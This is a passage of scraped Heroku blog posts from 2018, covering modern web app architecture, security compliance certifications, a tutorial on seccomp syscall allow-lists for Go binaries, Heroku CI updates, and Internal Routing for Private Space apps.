we do. Our desire for richer, more interactive, and lower latency web experiences has driven the popularity of single page apps and the JavaScript tools required to build them. Use of convenience libraries like jQuery gave way to libraries like Backbone.js and Knockout.js that finally supported the creation of a cohesive, maintainable app that runs in the user’s browser. The next generation of libraries—where we are now in 2018—including React, Angular, Ember, and Vue, were born out of our experiences with the first generation plus the exploding popularity of Node.js (here, as a build tool) and rapid improvements to JavaScript (or maybe more accurately, ECMAScript with versions ES2015, 16, 17, etc). So what architectural changes do we need to make to allow our web application to support single page apps? First, we need a way to more efficiently deliver JavaScript to the user’s browser. Single page apps include much more JavaScript (and possibly more images, videos, CSS, and HTML) than we had previously sent to the browser. Second, it means we need a publicly exposed API from which the single page app can get its dynamic data. So here’s the list of new concepts we’re going to add to our architecture: Content Delivery Network -- effectively a global network cache that can deliver JavaScript, HTML, CSS, and images to the user’s browser faster than our web server can. API Gateway -- a publicly exposed API from which the single page app can securely request the data it needs. Smartphones Today most of us expect to find a mobile app for any product or service we want to interact with—or at least a web site that works well on our mobile devices. We now use mobile devices for so many things we could do only in the desktop browser just ten years ago—or even new things we could never do in the desktop browser, like receive a notification based on location, scan a digital coupon, or track a workout. And this trend doesn’t look like it’s going away: in 2011, 10% of the world’s population were smartphone users, and now in 2018, a third are smartphone users . In many countries like the United States, Sweden, and South Korea, 70% of the population is using smartphones . The iOS App Store and Android Market (now Google Play) appeared in 2008 and ushered in the era of ubiquitous native mobile apps as mobile web browsers hadn’t and still don’t (although they are getting better and better) allow for the same user experience that a native app does. So what do we need to support a native mobile app in our architecture? We need a way for the app to communicate with our servers—to receive a push notification, receive a digital coupon, or save the GPS data for a user’s workout. Fortunately, we can use one of the concepts we added to support single page apps: an API Gateway. API as a New UI It seems that every company wants its own API now. Obviously companies like Heroku, GitHub, and Amazon Web Services whose customers are developers, need an API, but now many companies whose customers aren’t developers—like Bank of America , Macy’s , and Eli Lilly —have APIs. ProgrammableWeb’s API Directory lists over 19,000 public APIs that companies or other organizations have built, most of them from companies whose primary customers are not developers. All these APIs are a kind of new user interface for developers. An API opens your product up to endless possibilities of creative extension by millions of software developers. Google Maps, Twilio, and Braintree probably didn’t think about ride-sharing as a use case for their APIs, but Uber and Lyft wouldn’t have been possible without a mapping, SMS, and payment API. An API also provides a standard point of integration with your product. Often the electrical socket analogy is used to explain this. Without a standardized electrical socket, we would have to manually wire each new device we get into our home’s electrical system. The electrical socket gives us a standard interface between a device and the electrical grid. Similarly, because there are common standards for APIs, like REST over HTTP using JSON content type, we as developers need less time and proprietary expertise to integrate two disparate systems. As you might have guessed, this API can use the same architectural concept we added in the last section: an API Gateway. Streaming Data (And Lots of It) The software we create is producing data at an exponentially growing rate . And we are demanding much more from that data. We want data not only to build the user’s web or mobile experience, but we want it for reporting, for informing A/B tests or blue/green deploys, for user experience studies, for billing, and for compliance. And often we need a real-time view of that data with the flexibility to create different views to support evolving business requirements. The “data firehose” has emerged as a metaphor to describe harnessing all of this moving data. We need a data firehose to help move this data around in an organized way. It could be to move data from the point of production to storage, to allow internal services to communicate with each other, or to send real-time data to analysis and visualization tools. So what do we need to add to our architecture to manage, observe, analyze, and visualize streams of data? Apache Kafka -- a tool that can manage large streams of data reliably and to which data producers and data consumers can easily attach themselves AWS S3 / Google Cloud Storage -- effectively unlimited and redundant storage for all the data AWS RedShift / Google BigQuery -- a data warehouse tool to organize the data and make it queryable quickly Heroku Dataclips / Metabase / Looker -- data query and visualization tools that are simple to connect to the data warehouse and easy to start using Adaptability Ever-increasing complexity (i.e. business complexity, requirement complexity, software becoming more mission-critical to businesses, increased real-time expectations of users, growing data volumes, etc.) means developers need to build and operate more adaptable systems. An increasingly popular way to build a more adaptable system is to compose it from many small, discrete services. Call this technique what you want—microservices, distributed systems, service-oriented architecture, or even functions-as-a-service—the important concept is the composition of separately-maintained and deployed software components to form a single system. Building new functionality as separate services instead of within a monolith allows for easier separation of concern. As a developer, I can keep fewer concepts in my head while building or maintaining smaller services. As an engineering manager, my team can work on more in parallel. To be clear, this technique doesn’t come without pitfalls. Check out Ryan Townsend's blog post on his company’s journey of deconstructing a monolith into services. And Don’t Forget Scale Clearly, the need for scale is not new in 2018, but the addition of all these new architectural components makes scaling more difficult than it was a decade ago. Previously we could manage most of our scaling needs with three levers: horizontal scaling of web dynos (Heroku’s lightweight container technology), horizontal scaling of worker dynos, and vertical scaling of PostgreSQL. Now we have dozens of levers to worry about. And further compounding the scale problem is the relentless growth of internet users. Half the people on our beautiful blue marble have access to the internet! This is one area where PaaS and managed services show their value. The good ones reduce the number of levers you have to worry about to scale your system, letting you focus more on creating functionality for your users and less on operations and infrastructure. Bring It All Together So let’s look at all the components we need to add to our architecture: Content Delivery Network -- effectively a global network cache that can deliver JavaScript, HTML, CSS, and images to the user’s browser faster than our web server can. API Gateway -- a publicly exposed API from which the single page app can securely request the data it needs. Apache Kafka -- a tool that can manage large streams of data reliably and to which data producers and data consumers can easily attach themselves AWS S3 / Google Cloud Storage -- effectively unlimited and redundant storage for all the data AWS RedShift / Google BigQuery -- a data warehouse tool to organize the data and make it queryable quickly Heroku Dataclips / Metabase / Looker -- data query and visualization tools that are simple to connect to the data warehouse and easy to start using And the two new concepts we need to think about: Service-oriented architecture for adaptability Scalable-first design so that scaling is a normal operations activity, not a herculean one at 2am Let’s look at our new architecture from a high-level. All of the new components we discussed have been incorporated into a single system. A modern web app architecture in 2018 Compared to the version from 2008, it looks like a lot to build and manage, right? It could be, if you try to build and manage it all yourself. The truth is that using a PaaS like Heroku makes deploying and managing something like this much easier than building it yourself on an IaaS (or your own data center [shudder] ). Looking to the Future For sure, we still have many open questions. How do the dynos discover each other and communicate between themselves? What gets served from the CDN and how does it get there? How does Kafka write data to S3 or RedShift? How do code deploys work? How does CI/CD work? How do we monitor the health of all the components? What security concerns do we have to think about? In follow-up blog posts, we’ll zoom in to specific parts of this system and show you how to deploy them to Heroku. Until then, I hope this high-level architecture serves as a guide to the primary concepts many organizations need to think about as they’re building a web application in 2018. Many thanks to those who helped me write this post: Vik Rana, Charlie Gleason, Jennifer Hooper, Scott Truitt, Matt Schaar, Jon Mountjoy, Jon Byrum, Michael Friis, Hunter Loftis, Stephanie Chung, and Jonathan Fulton’s Web Architecture 101 post. Your reviews, discussions, ideas, inspiration, grammar help, drawings, and typo catches are greatly appreciated. architecture microservices web app scale mobile api streaming data", "date": "2018-08-14,"},
{"website": "Heroku", "title": "Announcing ISO 27001, 27017, 27018 Certification and SOC2 Type I Attestation", "author": ["Jamie Arlen"], "link": "https://blog.heroku.com/iso-soc-compliance", "abstract": "Announcing ISO 27001, 27017, 27018 Certification and SOC2 Type I Attestation Posted by Jamie Arlen August 23, 2018 Listen to this article Today we are proud to announce that Heroku has achieved several important compliance milestones that provide third party validation of our security best practices: ISO 27001 Certification: Widely recognized and internationally accepted information security standard that specifies security management best practices and comprehensive security controls following ISO 27002 best practices guidance. ISO 27017 Certification: A standard that provides additional guidance and implementation advice on information security aspects specific to cloud computing. ISO 27018 Certification: Establishes commonly accepted control objectives, controls and guidelines for implementing measures to protect Personally Identifiable Information (PII) in accordance with defined privacy principles for public cloud computing environments. SOC2 Type I Attestation: An independent examination of the fairness of presentation and the suitability of the design of controls relevant to security, availability and confidentiality of the information processed by the Heroku Platform as of a specified date. The scope of these certifications include the Heroku Runtimes (Common Runtime, Heroku Private Spaces and Heroku Shield Private Spaces) and Heroku Data Services (Heroku Postgres, Heroku Redis, Apache Kafka on Heroku and Heroku Connect). Developers from around the world entrust sensitive data to Heroku, and nothing is more important to us than honoring our custodial commitments in protecting this data. Trust is our number one value. It is this commitment to customer trust that directs the decisions we make every day. We know that compliance is an essential component of the customer trust journey and we see compliance as the byproduct of a relentless focus on security and engineering excellence. These compliance achievements are industry agnostic and benefit all Heroku customers (and their customers) by providing independent validation of the security controls and processes implemented by Heroku to protect data. These milestones expand upon the existing compliance program that has already demonstrated compliance for highly regulated data types such as PCI-DSS data (“credit card data”) and HIPAA data (“protected health information”). You can find more information regarding this announcement by visiting Heroku’s Security, Privacy and Compliance Dev Center article or our new Compliance Center . Privacy security Enterprise Trust SOC2 Type I ISO 27018 ISO 27017 ISO 27001 SOC2 ISO HIPAA compliance", "date": "2018-08-23,"},
{"website": "Heroku", "title": "Applying Seccomp Filters at Runtime for Go Binaries", "author": ["chris le roy"], "link": "https://blog.heroku.com/applying-seccomp-filters-on-go-binaries", "abstract": "Applying Seccomp Filters at Runtime for Go Binaries Posted by chris le roy August 29, 2018 Listen to this article Seccomp (short for security computing mode) is a useful feature provided by the Linux kernel since 2.6.12 and is used to control the syscalls made by a process. Seccomp has  been implemented by numerous projects such as Docker, Android, OpenSSH and Firefox to name a few. In this blog post, I am going to show you how you can implement your own seccomp filters, at runtime, for a Go binary on your Dyno. Why Use Seccomp Filters? By default, when you run a process on your Dyno, it is limited by which syscalls it can make because the Dyno has been implemented with a restricted set of seccomp filters. This means, for example, that  your process has access to syscalls A,B and C and not H and J as defined in the filters for your Dyno. This reduces the overall attack surface* of the Dyno (and is something of a best practice) but what if your process does not to make use of syscall A but only needs C and B? In this case, your process has an unnecessary syscall exposed which increases the attack surface of your process. By limiting the process attack surface, this increases the security posture of your process and if your process were to be compromised in some way, the compromise would be limited by default to the syscalls available to the process. This allows for a layered, defence in depth approach, whereby should one security control fail, another would be able to prevent further damage. ...if we were to create a program [that] was only required to create a folder at a specific location on the file system then we could apply a seccomp filter which would ensure that only the syscalls that are required to create a folder at a specific location are accessible to the program. For example, if we were to create a program and the program was only required to create a folder at a specific location on the file system then we could apply a seccomp filter which would ensure that only the syscalls that are required to create a folder at a specific location are accessible to the program. However, if the program were to modified—be it via the source code or some form of code injection—and the program then attempted to establish a network connection (e.g. via curl ), then the applied seccomp filter would block this behaviour. This behaviour is blocked because the syscalls required for the network connection have not been added to our program's seccomp filter. * Attack Surface is common lingo for security folks - maybe not everyday language for developers. Attack surface might be defined as an exposure presenting a malicious actor opportunity to attack or manipulate your environment to their own will - we seek to remove or contain these from their use at every possible opportunity. How Can We Use Seccomp Filters? For the remainder of this post, I am going to go through the steps on how to deploy a Go binary and have it implement seccomp filters at runtime. Firstly we need an application, in this case, I've created a Go program to create a folder at /tmp called moo .\nThe code for the program is located below: package main\n\nimport (\n\"fmt\"\n\"syscall\"\n)\n\nfunc main() {\n    err := syscall.Mkdir(\"/tmp/moo\", 0755)\n    if err != nil {\n        panic(err)\n    } else {\n        fmt.Printf(\"I just created a file\\n\")\n    }\n} We now have a simple Go program to create a folder. As we are working with syscalls, we need to determine what syscalls this program needs to execute successfully. There are multiple ways to determine this, but we will use the application binary and strace . Let's run the following to create the executable binary: $ go build -o makeTheFolder We now have the binary and if we execute it, we should get the following output: $ ./makeTheFolder\nI just created a file We now know that our binary is working and we are going to determine what syscalls are made. To achieve this, we will run the following command: $ strace -c ./makeTheFolder The output of the above command will be something like this: I just created a file\n% time seconds usecs/call calls errors syscall\n------ ----------- ----------- --------- --------- ----------------\n0.00 0.000000 0 3 read\n0.00 0.000000 0 1 write\n0.00 0.000000 0 4 open\n0.00 0.000000 0 4 close\n0.00 0.000000 0 4 fstat\n0.00 0.000000 0 25 mmap\n0.00 0.000000 0 12 mprotect\n0.00 0.000000 0 2 munmap\n0.00 0.000000 0 3 brk\n0.00 0.000000 0 120 rt_sigaction\n0.00 0.000000 0 11 rt_sigprocmask\n0.00 0.000000 0 5 5 access\n0.00 0.000000 0 4 clone\n0.00 0.000000 0 1 execve\n0.00 0.000000 0 1 getrlimit\n0.00 0.000000 0 2 sigaltstack\n0.00 0.000000 0 1 arch_prctl\n0.00 0.000000 0 1 gettid\n0.00 0.000000 0 1 futex\n0.00 0.000000 0 1 sched_getaffinity\n0.00 0.000000 0 1 set_tid_address\n0.00 0.000000 0 1 mkdirat\n0.00 0.000000 0 1 readlinkat\n0.00 0.000000 0 1 set_robust_list\n------ ----------- ----------- --------- --------- ----------------\n100.00 0.000000 210 5 total From the output above, we have a list of the syscalls that were executed by our makeTheFolder binary. Next we need to use our syscall list in such a way that when our binary is executed, it's process only has access to the syscalls it requires. To achieve this we will use seccomp, more specifically, we will be making use of the Go library libseccomp-golang which is the Go bindings for libseccomp . We will need to check if our local system supports seccomp and has the required dependencies for libseccomp-golang . To check if your kernel supports seccomp, run the following command: $ grep CONFIG_SECCOMP=/boot/config-$(uname -r) If your kernel supports seccomp, you should get the following returned: CONFIG_SECCOMP=y Additionally, we need to ensure that we have libseccomp-dev installed on our local system. To install this package, we can run the following command: $ apt-get install libseccomp-dev At this point, we have everything we need to start using the libseccomp-golang library. The following code will be used to achieve our goal of limiting the syscalls available to our binary at runtime: package main\n\nimport (\n    \"fmt\"\n    \"syscall\"\n    libseccomp \"github.com/seccomp/libseccomp-golang\"\n)\n\nfunc whiteList(syscalls []string) {\n\n    filter, err := libseccomp.NewFilter(libseccomp.ActErrno.SetReturnCode(int16(syscall.EPERM)))\n    if err != nil {\n        fmt.Printf(\"Error creating filter: %s\\n\", err)\n    }\n    for _, element := range syscalls {\n        fmt.Printf(\"[+] Whitelisting: %s\\n\",element)\n        syscallID, err := libseccomp.GetSyscallFromName(element)\n        if err != nil {\n            panic(err)\n        }\n        filter.AddRule(syscallID, libseccomp.ActAllow)\n    }\n    filter.Load()\n} The code above implements seccomp filters using a whitelist approach. We first apply a “deny all” filter to our seccomp filter which restricts access to all syscalls. This is achieved in this line of code: filter, err := libseccomp.NewFilter(libseccomp.ActErrno.SetReturnCode(int16(syscall.EPERM))) The method whiteList expects an array of type string which contains the names of the syscalls that we want our process to have access to. We make use of this list by iterating over the elements and then adding the syscall to our filter whitelist which allows our binary to have access to the syscall name provided. for _, element := range syscalls {\n        fmt.Printf(\"[+] Whitelisting: %s\\n\",element)\n        syscallID, err := libseccomp.GetSyscallFromName(element)\n        if err != nil {\n            panic(err)\n        }\n        filter.AddRule(syscallID, libseccomp.ActAllow)\n    } Once we are done adding our required syscalls to the filter, we then load the filter which applies the filter we just created to our binary at runtime. The code to load our filter is: filter.Load() We now have a mechanism to limit which syscalls our process will have access to. To use this in our makeTheFolder program, we  add the following code: package main\n\nimport (\n\"fmt\"\n\"syscall\"\n)\n\nfunc main() {\n     var syscalls = []string{\n     \"rt_sigaction\", \"mkdirat\", \"clone\", \"mmap\", \"readlinkat\", \"futex\", \"rt_sigprocmask\",\n     \"mprotect\", \"write\", \"sigaltstack\", \"gettid\", \"read\", \"open\", \"close\", \"fstat\", \"munmap\",\n     \"brk\", \"access\", \"execve\", \"getrlimit\", \"arch_prctl\", \"sched_getaffinity\", \"set_tid_address\", \"set_robust_list\"}\n\n    whiteList(syscalls)\n\n    err := syscall.Mkdir(\"/tmp/moo\", 0755)\n    if err != nil {\n        panic(err)\n    } else {\n        fmt.Printf(\"I just created a file\\n\")\n    }\n} Our addition to the code is a string array containing the names of the syscalls we extracted from our strace output, and we use this array when we call the method whiteList(syscalls) . We can now test our modified program using the same steps mentioned above: $ go build -o makeTheFolder && ./makeTheFolder The above command provides us with the following output: [+] Whitelisting: rt_sigaction\n[+] Whitelisting: mkdirat\n[+] Whitelisting: clone\n[+] Whitelisting: mmap\n[+] Whitelisting: readlinkat\n[+] Whitelisting: futex\n[+] Whitelisting: rt_sigprocmask\n[+] Whitelisting: mprotect\n[+] Whitelisting: write\n[+] Whitelisting: sigaltstack\n[+] Whitelisting: gettid\n[+] Whitelisting: read\n[+] Whitelisting: open\n[+] Whitelisting: close\n[+] Whitelisting: fstat\n[+] Whitelisting: munmap\n[+] Whitelisting: brk\n[+] Whitelisting: access\n[+] Whitelisting: execve\n[+] Whitelisting: getrlimit\n[+] Whitelisting: arch_prctl\n[+] Whitelisting: sched_getaffinity\n[+] Whitelisting: set_tid_address\n[+] Whitelisting: set_robust_list\nI just created a file\nSegmentation fault (core dumped) We can verify if our folder was created successfully by running the following command: $ file /tmp/moo\n/tmp/moo: directory Our process is successfully creating the folder we specified but our process crashed afterwards with what appears to be a Segmentation fault. After much investigation (which is beyond the scope of this blog post), I discovered that this crash was due to the process not having access to the exit_group syscall. I stumbled upon this error when verifying my strace output and noticed that the -c option for strace does not display syscalls that do not have a return type. To verify this, I ran strace again without the -c option and dumped the raw output to file. I used the following command: $ strace -o output.txt ./makeTheFolder The content of output.txt looks like this: .......\nmmap(NULL, 8392704, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0) = 0x7fb8fc8e0000\nmprotect(0x7fb8fc8e0000, 4096, PROT_NONE) = 0\nclone(child_stack=0x7fb8fd0dfff0, flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, parent_tidptr=0x7fb8fd0e09d0, tls=0x7fb8fd0e0700, child_tidptr=0x7fb8fd0e09d0) = 16335\nrt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0\nrt_sigprocmask(SIG_SETMASK, ~[RTMIN RT_1], [], 8) = 0\nmmap(NULL, 8392704, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0) = 0x7fb8fc0df000\nmprotect(0x7fb8fc0df000, 4096, PROT_NONE) = 0\nclone(child_stack=0x7fb8fc8deff0, flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, parent_tidptr=0x7fb8fc8df9d0, tls=0x7fb8fc8df700, child_tidptr=0x7fb8fc8df9d0) = 16336\nrt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0\nrt_sigprocmask(SIG_SETMASK, ~[RTMIN RT_1], [], 8) = 0\nmmap(NULL, 8392704, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0) = 0x7fb8fb8de000\nmprotect(0x7fb8fb8de000, 4096, PROT_NONE) = 0\nclone(child_stack=0x7fb8fc0ddff0, flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, parent_tidptr=0x7fb8fc0de9d0, tls=0x7fb8fc0de700, child_tidptr=0x7fb8fc0de9d0) = 16337\nrt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0\nfutex(0x72f7c8, FUTEX_WAIT, 0, NULL) = 0\nrt_sigprocmask(SIG_SETMASK, ~[RTMIN RT_1], [], 8) = 0\nmmap(NULL, 8392704, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0) = 0x7fb8fb0dd000\nmprotect(0x7fb8fb0dd000, 4096, PROT_NONE) = 0\nclone(child_stack=0x7fb8fb8dcff0, flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, parent_tidptr=0x7fb8fb8dd9d0, tls=0x7fb8fb8dd700, child_tidptr=0x7fb8fb8dd9d0) = 16338\nrt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0\nreadlinkat(AT_FDCWD, \"/proc/self/exe\", \"/home/brompwnie/go/src/github.co\"..., 128) = 68\nmmap(NULL, 262144, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fb8fda88000\nmkdirat(AT_FDCWD, \"/tmp/moo\", 0755) = 0\nwrite(1, \"I just created a file\\n\", 22) = 22\nexit_group(0) = ?\n+++ exited with 0 +++ The output above contains a list of the syscalls that were executed, their return values and other information. The return value = ? indicates that the syscall exit_group does not have a return value. strace does not display these sycalls with the -c option so it is recommended that you analyze both output formats to ensure that you get all the syscalls needed by the process. At this point, our process is executing successfully but crashing near the end of execution. To remediate this, we add the exit_group syscall to our list of syscalls to whitelist as shown below: var syscalls = []string{\n\"rt_sigaction\", \"mkdirat\", \"clone\", \"mmap\", \"readlinkat\", \"futex\", \"rt_sigprocmask\",\n\"mprotect\", \"write\", \"sigaltstack\", \"gettid\", \"read\", \"open\", \"close\", \"fstat\",\n\"munmap\",\"brk\", \"access\", \"execve\", \"getrlimit\", \"arch_prctl\", \"sched_getaffinity\",\n\"set_tid_address\", \"set_robust_list\", \"exit_group\"} We can now rebuild and check if our new whitelist of syscalls works with the following command: $ go build -o makeTheFolder && ./makeTheFolder The above command should result in the following output: [+] Whitelisting: rt_sigaction\n[+] Whitelisting: mkdirat\n[+] Whitelisting: clone\n[+] Whitelisting: mmap\n[+] Whitelisting: readlinkat\n[+] Whitelisting: futex\n[+] Whitelisting: rt_sigprocmask\n[+] Whitelisting: mprotect\n[+] Whitelisting: write\n[+] Whitelisting: sigaltstack\n[+] Whitelisting: gettid\n[+] Whitelisting: read\n[+] Whitelisting: open\n[+] Whitelisting: close\n[+] Whitelisting: fstat\n[+] Whitelisting: munmap\n[+] Whitelisting: brk\n[+] Whitelisting: access\n[+] Whitelisting: execve\n[+] Whitelisting: getrlimit\n[+] Whitelisting: arch_prctl\n[+] Whitelisting: sched_getaffinity\n[+] Whitelisting: set_tid_address\n[+] Whitelisting: set_robust_list\nI just created a file The output above indicates that our process successfully created the folder moo at the correct location /tmp and exited gracefully. At this point we have our Go program running locally as required with seccomp filters, which means that when when the binary makeTheFolder is executed, its process can only use the syscalls that we specified. Syscall Blocking in Action In the previous section, we implemented a whitelist to allow for the program to create a folder moo at /tmp but what would happen if the program were to be modified and attempted to execute the following code? ....\n    whiteList(syscalls)\n\n    err := syscall.Mkdir(\"/tmp/moo\", 0755)\n    if err != nil {\n        panic(err)\n    } else {\n        fmt.Printf(\"I just created a file\\n\")\n    }\n    err2 := syscall.Exec(\"/bin/ls\", []string{\"ls\", \"-l\"}, nil)\n} The code above attempts to run the ls -l command and if it were to be executed from within our seccomp whitelisted program, we would get the following output: ...\n[+] Whitelisting: getrlimit\n[+] Whitelisting: arch_prctl\n[+] Whitelisting: sched_getaffinity\n[+] Whitelisting: set_tid_address\n[+] Whitelisting: set_robust_list\n[+] Whitelisting: exit_group\nI just created a file\nls: reading directory '.': Operation not permitted\ntotal 0 The output above tells us that the operation was not permitted, and this operation was the command ls -l , which was executed by syscall.Exec .  We did not whitelist the syscalls required for the command ls -l ( ioctl , getdents , and statfs ) therefore it is not allowed to be executed within the context of our program. We just blocked non-whitelisted syscalls. Figure 1: How whitelisted syscalls can be used to restrict the syscalls executed by a process. How Do We Implement This on Heroku? We can implement this on Heroku as you would with any other Go program on Heroku. First, make sure you have the dependency libseccomp-golang added to your project via Govendor or Godeps and simply deploy. I made use of Govendor and had the following entry in my vendor.json file: \"package\": [\n        {\n            \"checksumSHA1\": \"bCj0+g9CKyCA90SlDxaPA6+zZeg=\",\n            \"path\": \"github.com/seccomp/libseccomp-golang\",\n            \"revision\": \"f6ec81daf48e41bf48b475afc7fe06a26bfb72d1\",\n            \"revisionTime\": \"2017-06-09T13:46:05Z\"\n        }\n    ], And there you go. You now know how to implement seccomp filters at runtime for your Go binaries. We have added the necessary packages required such as libseccomp-dev to the build environment so that we can achieve this. You can find the full list of packages available below. Conclusion In this blog post, we discussed how you can configure and deploy Go binaries with seccomp at runtime to harden your processes. This allows Go developers to programmatically reduce the attack surface of their deployed processes and allows developers to embrace the “shift left” philosophy for secure software development. Shoutout This post and functionality would not have been made possible without Heroku's Build Team adding the required packages to the Heroku stack images . Thank you! Useful Links https://github.com/seccomp/libseccomp-golang https://docs.docker.com/engine/security/seccomp/ https://devcenter.heroku.com/articles/go-dependencies-via-govendor https://devcenter.heroku.com/articles/stack-packages https://blog.jessfraz.com/post/getting-towards-real-sandbox-containers/ https://blog.jessfraz.com/post/a-rant-on-usable-security/ http://man7.org/linux/man-pages/man1/strace.1.html https://lwn.net/Articles/656307/ https://wiki.mozilla.org/Security/Sandbox/Seccomp https://www.kernel.org/doc/Documentation/prctl/seccomp_filter.txt https://www.devsecops.org/blog/2016/5/20/-security https://golang.org/pkg/syscall/#Exec devsecops SSDL binary security seccomp golang", "date": "2018-08-29,"},
{"website": "Heroku", "title": "Heroku CI Updates: Parallel Tests, CI API, and Automated UAT", "author": ["DeVaris Brown"], "link": "https://blog.heroku.com/ci-parallel-tests", "abstract": "Heroku CI Updates: Parallel Tests, CI API, and Automated UAT Posted by DeVaris Brown September 12, 2018 Listen to this article Since we introduced Heroku CI over a year ago, we've been hard at work developing features aimed at making your testing speed even faster and workflow more optimized. Today we are pleased to announce Heroku CI Parallel Test Runs and the Heroku CI API are now generally available (GA) for all Heroku customers. Parallel Test Runs allows you to split up and execute test runs on up to 16 nodes.  With the Heroku CI API, you can create, trigger, and receive test run info from your own custom workflow or CD tools. Additionally, we are opening up our support for cross-browser UAT via integration with third-party providers to private beta participants. Need for Speed As applications grow and become more complex, the size and execution time of the tests increases. We initially designed Heroku CI to be fast by making it low-config and immediately executing tests without needed a queue, but our users needed more. With Parallel Tests for CI , we now provide support for splitting test runs across up to 16 dynos to substantially reduce execution time. Since launching our limited private beta, customers have seen great improvements in test execution time. As soon as we heard about the Heroku CI beta, we jumped in. Once the basic setup was done, moving to Parallel Test Runs was pretty easy; we now run tests on 4 dynos in parallel which divided the overall test run time by almost 4. — Florent Galland,  Cofounder, Dougs.fr We were previously using Bitbucket Pipelines and it took around 40 to 50 minutes to run all our tests. After we decided to migrate to Heroku, in a few hours we were up and running with our custom spec setup, running both linters and tests. With Parallel Test Runs, our pipeline time dropped to 8 to 10 minutes. - Manuel Puyol, Engineer, Qulture.Rocks More Control Over Your CI Workflow Heroku's developer experience and CI/CD workflows are built to enable dev teams to collaborate more efficiently. As more teams adopt Heroku, we've seen various ways they're trying to script Heroku's CI to fit within their existing infrastructure using the CI CLI . To make integration and customization easier, we're publishing our API documentation for CI. With the CI API, we support the following use cases: Test Case Test Case List Test Node Test Node List Test Run Test Run Create Test Run Info Test Run List Test Run Update Support for Third Party UAT Providers We've offered UAT in the past via headless Chrome and xvfb , but our users desired a more expansive offering that would allow them to visually test their applications in more browsers. We saw our customers manually testing their Review Apps and staging apps with third-party UAT providers such as Functionize and Sauce Labs . To make that process easier, we now provide access to a testable version of your application via an environment variable. If you're interested in learning more about our new UAT offering and would like to participate in the limited private beta, check out our documentation . Looking Ahead This year, we will continue to offer additional features aimed at optimizing your workflow and giving you more control over how your apps are built, deployed, and scaled on our platform. As always, we'd love to hear from you as we look to direct and prioritize these efforts. Please contact us with your feedback.", "date": "2018-09-12,"},
{"website": "Heroku", "title": "Internal Routing for Private Space Apps", "author": ["Michael Friis"], "link": "https://blog.heroku.com/private-spaces-internal-routing", "abstract": "Internal Routing for Private Space Apps Posted by Michael Friis September 13, 2018 Listen to this article Today we’re announcing a powerful new network control for apps running in Heroku Private Spaces : Internal Routing. Apps with Internal Routing work exactly the same as other Heroku apps, except the web process type is published to an endpoint that’s routable only within the Private Space and on VPC and VPN peered networks (see the Private Space VPN support companion post ). Apps with Internal Routing are impossible to access directly from the public internet, improving security and simplifying management and compliance checks for web sites, APIs and services that must not be publicly accessible. Internal Routing unlocks several exciting new use cases: Intranet-like apps that are only accessible to users from a VPN connected on-prem network (see the VPN blog post to learn how Heroku customer Cabinet Secretariat is planning to do that) Apps (such as APIs or microservices components) deployed on Heroku and consumed securely and solely by other Heroku apps in the same space Multi-cloud apps consisting of Heroku microservices consumed from software running in a peered customer AWS VPC Creating Internal Routing apps is easy, and come with all the benefits of standard Heroku apps: Simple build, test and deployment Easy management and collaboration Quick scaling as load increases Heroku already has a couple of other features that facilitate intra-space networking and limiting app access: Private Space DNS Service Discovery : Direct network connections between dynos and process types (but no logging stack and thus no request logging or SSL termination) Trusted IP ranges : Limit external access to all apps in a space to a set of CIDR ranges (but no per-app granularity and can be hard to manage as IPs come in and out of use) Internal Routing is a great complement to those features, especially for customers that are using VPNs or peered VPCs with Heroku Private Spaces. Using Internal Routing Creating an internally routed app is as simple as creating a normal one: $ heroku apps:create --internal-routing --space test-space\nCreating app... done, ⬢ frozen-oasis-70544\nhttp://frozen-oasis-70544.herokuapp.com/ | https://git.heroku.com/frozen-oasis-70544.git Once you’ve deployed code to an internal app, if you try connecting to <appname>.herokuapp.com over the public internet, you won’t be able to open a connection. You can, however, get a shell in a dyno and use curl to test: $ heroku run bash -a frozen-oasis-70544\n...\n$ curl -I http://frozen-oasis-70544.herokuapp.com/\nHTTP/1.1 200 OK\n... Accessing the endpoint from a peered AWS VPC or a VPN-connected network will also work. Because accessing apps with internal routing is a little unwieldy, we recommend developing and testing code with normal non-internal Heroku apps, only without sensitive data and using standard access controls such as username/password and Trusted IP ranges. Note that converting an existing Heroku app to an internal one is not currently supported. If you have an existing app that you want to make internal, you’ll have to create a new internal app and re-deploy to that. HTTP requests for internal web apps transit the exact same routing stack as requests for standard apps which means you get all the benefits of request logging , application metrics and a consistent management and operations experience . Custom domains and SSL also work exactly the same as on standard apps, except that any custom domain you add will ultimately resolve to private IP addresses that are only routable within the private space and on peered or connected networks. Summary Internal Routing is great for Heroku customers that want to publish HTTP apps, APIs and services for internal-only consumption from within a Private Space (and connected networks). It’s another feature that makes Heroku “Better Together” with existing enterprise systems deployed on-prem or on AWS. Internal Routing lets customers use Heroku’s high-productivity development, deployment and collaboration features for very sensitive apps and workloads that require strict network-level access restrictions. To learn more about Internal Routing, see the Dev Center article here , or contact Heroku. Trusted IPs service discovery Private Spaces VPN AWS hybrid cloud multi-cloud microservices Trust Enterprise security Privacy VPC Peering Internal Routing", "date": "2018-09-13,"},
